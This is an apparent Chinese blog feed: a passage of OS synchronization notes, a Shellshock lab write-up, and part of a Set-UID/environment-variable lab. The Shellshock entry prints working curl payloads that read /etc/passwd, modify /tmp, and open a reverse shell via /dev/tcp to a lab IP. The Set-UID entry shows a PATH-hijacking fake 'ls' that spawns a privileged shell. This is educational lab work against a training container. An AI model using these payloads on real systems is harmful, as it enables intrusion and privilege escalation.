class="hljs-built_in">signal</span>(readCountSignal); <span class="hljs-comment">//释放读者计数器资源</span><br>    &#125;<br>&#125;<br> <br><span class="hljs-built_in">writer</span>()<br>&#123;<br>     <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)<br>     &#123;<br>        <span class="hljs-built_in">wait</span>(keySignal);     <span class="hljs-comment">//申请令牌</span><br>        <span class="hljs-built_in">wait</span>(fileSrc);       <span class="hljs-comment">//申请文件资源</span><br> <br>        ...<br>        perform write operation <span class="hljs-comment">//执行临界区代码</span><br>        ...<br> <br>        <span class="hljs-built_in">signal</span>(fileSrc);   <span class="hljs-comment">//释放文件资源</span><br>        <span class="hljs-built_in">signal</span>(keysignal); <span class="hljs-comment">//释放令牌</span><br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="6-6-3-哲学家进餐回题"><a href="#6-6-3-哲学家进餐回题" class="headerlink" title="6.6.3 哲学家进餐回题"></a>6.6.3 哲学家进餐回题</h4><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116170946819.png" alt="image-20211116170946819"></p><p><strong>死锁解决方法：</strong></p><ul><li>至多只允许四位哲学家同时去拿左边的筷子；</li><li>仅当哲学家左右两边的筷子均可用时才允许他拿起筷子；</li><li>规定奇数号哲学家先拿起他左边的筷子，而偶数号哲学家先拿起他右边的筷子。</li></ul><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116171117548.png" alt="image-20211116171117548"></p><p><img src="/2021/11/17/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5/image-20211116171127875.png" alt="image-20211116171127875"></p><h3 id="6-7-管程"><a href="#6-7-管程" class="headerlink" title="6.7 管程"></a>6.7 管程</h3><h4 id="6-7-1-使用"><a href="#6-7-1-使用" class="headerlink" title="6.7.1 使用"></a>6.7.1 使用</h4><h4 id="6-7-2-哲学家进餐问题的管程解决方案"><a href="#6-7-2-哲学家进餐问题的管程解决方案" class="headerlink" title="6.7.2 哲学家进餐问题的管程解决方案"></a>6.7.2 哲学家进餐问题的管程解决方案</h4><h4 id="6-7-3-基于信号量的管程实现"><a href="#6-7-3-基于信号量的管程实现" class="headerlink" title="6.7.3 基于信号量的管程实现"></a>6.7.3 基于信号量的管程实现</h4><h4 id="6-7-4-管程内的进程重启"><a href="#6-7-4-管程内的进程重启" class="headerlink" title="6.7.4 管程内的进程重启"></a>6.7.4 管程内的进程重启</h4><h3 id="6-8-同步实例"><a href="#6-8-同步实例" class="headerlink" title="6.8 同步实例"></a>6.8 同步实例</h3><h4 id="6-8-1-Solaris同步"><a href="#6-8-1-Solaris同步" class="headerlink" title="6.8.1 Solaris同步"></a>6.8.1 Solaris同步</h4><h4 id="6-8-2-Windows-XP同步"><a href="#6-8-2-Windows-XP同步" class="headerlink" title="6.8.2 Windows XP同步"></a>6.8.2 Windows XP同步</h4><h4 id="6-8-3-Linux同步"><a href="#6-8-3-Linux同步" class="headerlink" title="6.8.3 Linux同步"></a>6.8.3 Linux同步</h4><h4 id="6-8-4-Pthread同步"><a href="#6-8-4-Pthread同步" class="headerlink" title="6.8.4 Pthread同步"></a>6.8.4 Pthread同步</h4><h3 id="6-9-原子事务"><a href="#6-9-原子事务" class="headerlink" title="6.9 原子事务"></a>6.9 原子事务</h3><h4 id="6-9-1-系统模型"><a href="#6-9-1-系统模型" class="headerlink" title="6.9.1 系统模型"></a>6.9.1 系统模型</h4><h4 id="6-9-2-基于日志的恢复"><a href="#6-9-2-基于日志的恢复" class="headerlink" title="6.9.2 基于日志的恢复"></a>6.9.2 基于日志的恢复</h4><h4 id="6-9-3-检查点"><a href="#6-9-3-检查点" class="headerlink" title="6.9.3 检查点"></a>6.9.3 检查点</h4><h4 id="6-9-4-并发原子操作"><a href="#6-9-4-并发原子操作" class="headerlink" title="6.9.4 并发原子操作"></a>6.9.4 并发原子操作</h4><h3 id="6-10-小结"><a href="#6-10-小结" class="headerlink" title="6.10 小结"></a>6.10 小结</h3><h3 id="6-11-习题"><a href="#6-11-习题" class="headerlink" title="6.11 习题"></a>6.11 习题</h3><p><strong>试分析说明为何自旋锁（spinlocks）不适合单处理器系统但却常用于多处理器系统</strong></p><blockquote><p>解答：<br>自旋锁（进程在其等待锁时还在运行）的缺点是忙等待，当一个进程位于其临界区内时，任何其它试图进入其临界区的进程都必须在其进入代码中连续地循环。在单处理器系统中，忙等待浪费了CPU时钟（这些时钟本来可以有效地为其他进程所使用）。<br>自旋锁的优点就是，进程在等待锁时不会进行上下文切换，而上下文切换可能需要花费相当长的时间。因此，如果锁的占用时间短，自旋锁就可以变得非常有用。它常常用于多处理器系统中，这样一个线程在一个处理器自旋时，另一线程可在另一处理器上在其临界区内执行。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellshock Attack lab</title>
    <link href="/2021/10/29/Shellshock_Attack_lab/"/>
    <url>/2021/10/29/Shellshock_Attack_lab/</url>
    
    <content type="html"><![CDATA[<h1 id="Shellshock-Attack-lab"><a href="#Shellshock-Attack-lab" class="headerlink" title="Shellshock_Attack_lab"></a>Shellshock_Attack_lab</h1><h2 id="task-1"><a href="#task-1" class="headerlink" title="task 1"></a>task 1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vul.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>setuid(geteuid());<br>system(<span class="hljs-string">&quot;/bin/ls -l&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先准备有漏洞的程序vul.c</p><p>然后我们编译运行，并将其变成一个set-UID程序</p><p>因为Ubuntu20.04中/bin/sh指向/bin/dash，而这个程序没有shellshock漏洞，所以需要更改符号链接，采用命令</p><p><code>sudo ln -sf /bin/bash_shellshock /bin/sh</code></p><p>同时我们发现20.04中/bin文件夹下没有bash_shellshock文件，所以我们需要sudo su进入root后自己cp一下。</p><p>我们定义一个shell变量foo并输出它，这样当运行set-UID程序（vul)时，shell变量会变成子进程的环境变量。由于system函数的原因，Bash会被调用，它监测到环境变量foo中存放了一个环境声明，因此会解析该声明，由于逻辑解析的漏洞，它最终会执行放在末尾的/bin/sh指令，所以我之后会成功进入一个具有root权限的shell程序。</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027172958405.png" alt="image-20211027172958405"></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027173023492.png" alt="image-20211027173023492"></p><p>将链接改回去后再次执行vul,我们发现程序正常，没有被攻击。</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027174008884.png" alt="image-20211027174008884"></p><h2 id="task-2"><a href="#task-2" class="headerlink" title="task 2"></a>task 2</h2><h3 id="task-2-A-Using-brower"><a href="#task-2-A-Using-brower" class="headerlink" title="task 2.A: Using brower"></a>task 2.A: Using brower</h3><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027180800482.png" alt="image-20211027180800482"></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211027180830505.png" alt="image-20211027180830505"></p><p> Apache服务器会从http请求头中获取信息，赋值给CGI程序的环境变量。</p><h3 id="task-2-B-Using-curl"><a href="#task-2-B-Using-curl" class="headerlink" title="task 2.B Using curl"></a>task 2.B Using curl</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure><p>-v  打印出http请求头</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028162819689.png" alt="image-20211028162819689"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -A <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure><p>-A  设置User-Agent</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028162913084.png" alt="image-20211028162913084"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -e <span class="hljs-string">&quot;my data&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure><p>-e 设置Referer字段</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028163009475.png" alt="image-20211028163009475"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -H <span class="hljs-string">&quot;AAAAAA: BBBBBB&quot;</span> -v www.seedlab-shellshock.com<span class="hljs-regexp">/cgi-bin/g</span>etenv.cgi<br></code></pre></td></tr></table></figure><p>-H 设置额外头字段</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028163108646.png" alt="image-20211028163108646"></p><h2 id="task-3"><a href="#task-3" class="headerlink" title="task 3"></a>task 3</h2><h3 id="Task-3-A"><a href="#Task-3-A" class="headerlink" title="Task 3.A:"></a>Task 3.A:</h3><ul><li><strong>Get the server to send back the content of the /etc/passwd file.</strong></li></ul><p>利用了-A修改User-Agent字段</p><p>执行命令</p><p><code>curl -A &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/cat /etc/passwd&quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028165749466.png" alt="image-20211028165749466"></p><h3 id="Task-3-B"><a href="#Task-3-B" class="headerlink" title="Task 3.B:"></a>Task 3.B:</h3><p> <strong>Get the server to tell you its process’ user ID. Y ou can use the /bin/id command to print out the ID information.</strong></p><p>利用-e修改Referer字段来获取ID</p><p>执行命令</p><p><code>curl -e &quot;() &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/id&quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028170325981.png" alt="image-20211028170325981"></p><h3 id="Task-3-C"><a href="#Task-3-C" class="headerlink" title="Task 3.C:"></a>Task 3.C:</h3><p> <strong>Get the server to create a file inside the /tmp folder. Y ou need to get into the container to see whether the file is created or not, or use another Shellshock attack to list the /tmp folder.</strong></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028172005730.png" alt="image-20211028172005730"></p><p>利用-H创建额外头字段</p><p>查看tmp</p><p><code>curl -H  &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/ls  /tmp &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p>创建test</p><p><code>curl -H  &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/touch  /tmp/test &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028193945048.png" alt="image-20211028193945048"></p><h3 id="Task-3-D"><a href="#Task-3-D" class="headerlink" title="Task 3.D:"></a>Task 3.D:</h3><p> <strong>Get the server to delete the file that you just created inside the /tmp folder</strong></p><p>删除test</p><p><code>curl -H  &quot;test: () &#123; echo hello; &#125;; echo Content_type: text/plain; echo; /bin/rm /tmp/test &quot; http://www.seedlab-shellshock.com/cgi-bin/vul.cgi</code></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028194013384.png" alt="image-20211028194013384"></p><p>Q1:不能打开/etc/shadow，因为只是www-data权限，权限不够，需要root权限</p><p>Q2：不能成功，不能成功将带空格的字符串设置为环境变量，所以不能攻击成功</p><h2 id="test-4"><a href="#test-4" class="headerlink" title="test 4"></a>test 4</h2><p><code>nc -lvnp 9090</code></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028205201563.png" alt="image-20211028205201563"></p><p><code>curl -A &quot;() &#123; echo hello;&#125;; echo Content_type: text/plain; echo; echo; /bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1&quot; http://10.9.0.80/cgi-bin/vul.cgi</code></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028205013091.png" alt="image-20211028205013091"></p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028205206476.png" alt="image-20211028205206476"></p><h2 id="test-5"><a href="#test-5" class="headerlink" title="test 5"></a>test 5</h2><p>新建一个vul.cgi修改为bash后，重新dcbuild一个容器，后再次执行攻击，发现攻击无法成功。因为bash填补了shellshock漏洞，所以无法攻击成功。</p><p><img src="/2021/10/29/Shellshock_Attack_lab/image-20211028211429143.png" alt="image-20211028211429143"></p>]]></content>
    
    
    <categories>
      
      <category>软件安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>环境变量和set-UID程序</title>
    <link href="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/"/>
    <url>/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="Environment-Variable-and-Set-UID-Program-Lab"><a href="#Environment-Variable-and-Set-UID-Program-Lab" class="headerlink" title="Environment Variable and Set-UID Program Lab"></a>Environment Variable and Set-UID Program Lab</h1><h2 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h2><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021190558511.png" alt="image-20211021190558511"></p><ul><li><p>使用<code>printenv</code>打印环境变量</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021190734705.png" alt="image-20211021190734705"></p></li><li><p>使用<code>export</code>设置环境变量的值,用<code>echo</code>查看设置结果</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021192046493.png" alt="image-20211021192046493"></p></li><li><p>使用<code>unset</code>删除环境变量，用<code>echo</code>查看设置结果</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021192112022.png" alt="image-20211021192112022"></p></li></ul><h2 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1."></a>Step 1.</h3><p>首先编译<code>myprintenv.c</code>文件</p><p>然后结果保存在<code>file</code>中</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021192345242.png" alt="image-20211021192345242"></p><p>观察file文件，我们可以发现是各个环境变量的值</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021192715013.png" alt="image-20211021192715013"></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>按照要求注释掉子进程的printenv语句，将父进程的printenv语句取消注释</p><p>重新编译，将结果保存在file2文件中，发现同样是环境变量的值</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021194639135.png" alt="image-20211021194639135"></p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>用diff命令比较file和file2的差异，发现两者是相同的，说明子进程完全继承了父进程的环境变量。</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021194823695.png" alt="image-20211021194823695"></p><p>进一步查阅资料可知</p><p>子进程完全复制了父进程的资源，包括进程上下文、代码区、数据区、堆区、栈区、内存信息、打开文件的文件描述符、信号处理函数、进程优先级、进程组号、当前工作目录、根目录、资源限制和控制终端等信息，而子进程与父进程的区别有进程号、资源使用情况和计时器等。</p><h2 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h2><h3 id="Step-1-1"><a href="#Step-1-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>编译运行myenv.c，发现结果为空</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">2</span>];<br><br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/usr/bin/env&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>, argv, <span class="hljs-literal">NULL</span>);  <br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021195206499.png" alt="image-20211021195206499"></p><h3 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h3><p>将代码修改为如下方所示的代码后，再次编译运行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">char</span> *argv[<span class="hljs-number">2</span>];<br><br>  argv[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/usr/bin/env&quot;</span>;<br>  argv[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-comment">//execve(&quot;/usr/bin/env&quot;, argv, NULL);  </span><br>  <span class="hljs-built_in">execve</span>(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>, argv, environ);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> ;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现程序打印出了环境变量的值。</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021195323867.png" alt="image-20211021195323867">函数execve()的作用，其调用格式如下：<br>int execve(const char * filename，char * const argv[]，char * const envp[])<br>其有三个参数，第一个参数filename指向要运行的新程序的路径，第二个参数argv数组包含新程序的所有参数，第三个参数envp数组包含新程序的环境变量。</p><p>如果将envrion传给execve()函数，则新进程想将他自己的环境变量传给新程序。如果设为NULL，则不传递任何环境变量</p><h3 id="Step-3-1"><a href="#Step-3-1" class="headerlink" title="Step 3"></a>Step 3</h3><p>进程在被初始化时通过以下两种方式获取环境变量。</p><p>第一种方式，如果是一个新创建的进程，即使用fork（）系统调用(在UNLX中)生成的进程，在这种情况下，子进程的内存是父进程内存的副本，也就是说，子进程将继承父进程所有的环境变量。</p><p>第二种方式，如果进程自身通过 execve（）系统调用运行一个新的程序（而不是在子进程中运行），进程的内存将会被新程序的数据覆盖，因此进程中存储的所有环境变量将会丢失。如果一个进程希望将环境变量传递给新运行的程序，它需要在调用 execve（）函数时显式地传递环境变量。</p><h2 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h2><p>保存编译运行下方的代码，可以发现结果是打印出了环境变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/usr/bin/env&quot;</span>);<br>return0 ;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021202226212.png" alt="image-20211021202226212"></p><p>system（）的函数说明</p><p>system（）会调用fork()产生子进程，由子进程来调用/bin/sh-c string来执行参数string字符串所代表的命令，此命令执行完后随即返回原调用的进程。在调用system（）期间SIGCHLD 信号会被暂时搁置，SIGINT和SIGQUIT 信号则会被忽略。</p><p>返回值</p><p>如果fork（）失败 返回-1：出现错误</p><p>如果exec（）失败，表示不能执行Shell，返回值相当于Shell执行了<a href="https://baike.baidu.com/item/exit">exit</a>（127）</p><p>如果执行成功则返回子Shell的终止状态</p><p>如果system（）在调用/bin/sh时失败则返回127，其他失败原因返回-1。若参数string为空指针（NULL），仅当命令处理程序可用时，返回非零值，可以通过这一特征判断在一个给定的操作系统上是否支持system函数(当system函数返回值为0时，表明system函数无效，在UNIX系统中，system函数总是可用的)；。如果system（）调用成功则最后会返回执行shell命令后的返回值，但是此返回值也有可能为 system（）调用/bin/sh失败所返回的127，因此最好能再检查errno 来确认执行成功。</p><h2 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h2><h3 id="Step-1-2"><a href="#Step-1-2" class="headerlink" title="Step 1"></a>Step 1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span>**environ;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (environ[i] != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, environ[i]);<br>        i++;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>将代码保存在foo.c中</p><p>编译运行，打印出环境变量</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021203257312.png" alt="image-20211021203257312"></p><h3 id="Step-2-2"><a href="#Step-2-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>将程序的拥有者改为root, 同时将其变成set-UID程序</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211021204849038.png" alt="image-20211021204849038"></p><h3 id="Step-3-2"><a href="#Step-3-2" class="headerlink" title="Step 3"></a>Step 3</h3><p>按照题目要求设置三个环境变量，然后运行已经是特权程序的foo。</p><p>我们可以看到wza和PATH环境变量都成功出现，但是LD_LIBRARY_PATH始终没有出现在环境变量中</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022110105522.png" alt="image-20211022110105522"></p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022110154632.png" alt="image-20211022110154632"></p><p>运行foo单独抓去LD变量，可以发现输出为空白，没有找到</p><p>我们将foo的拥有者改回seed ，发现LD_LIBRARY_PATH这个出现了。</p><p>这说明这个环境变量会对动态链接器的行为产生影响，所以它在动态链接器的进程中被屏蔽掉了，从而不会再对特权程序的动态链接产生影响。</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022110351472.png" alt="image-20211022110351472"></p><h2 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h2><p>运行代码</p><p>task6.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意代码</p><p>ls.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/bash -p&quot;</span>);<br></code></pre></td></tr></table></figure><p>将运行代码编译后保存为task6可执行文件</p><p>将恶意代码编译保存为ls,保存在当前文件夹中</p><p>首先我们执行task6,此时正常调用/bin/ls指令</p><p>然后我们改变task6的所有者为root,同时设置其为特权程序，然后将当前文件夹包含在环境变量PATH中，再次执行我们发现程序得到的只是一个普通的shell</p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211024152521937.png" alt="image-20211024152521937"></p><p><img src="/2021/10/24/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%92%8Cset-UID%E7%A8%8B%E5%BA%8F/image-20211022115545732.png" alt="image-20211022115545732"></p><p>阅读资料后我们可以知道，这是由于Ubuntu20.04的保护机制导致的，我们采用<code>sudo ln -sf /bin/zsh 